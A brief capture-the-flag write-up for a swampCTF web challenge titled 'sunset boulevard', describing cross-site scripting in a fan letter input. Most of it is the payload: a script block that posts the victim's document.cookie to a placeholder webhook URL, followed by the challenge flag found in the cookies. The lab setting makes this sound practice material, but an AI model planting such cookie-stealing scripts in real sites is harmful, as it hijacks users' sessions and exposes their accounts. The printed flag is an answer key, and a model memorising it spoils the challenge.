## sunset boulevard
XSS in fan letter input

payload -
```
<script>
fetch('WEBHOOK_URL', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ cookies: document.cookie })
});
</script>

```
flag in cookies
```swampCTF{THIS_MUSICAL_WAS_REVOLUTIONARY_BUT_ALSO_KIND_OF_A_SNOOZE_FEST}```
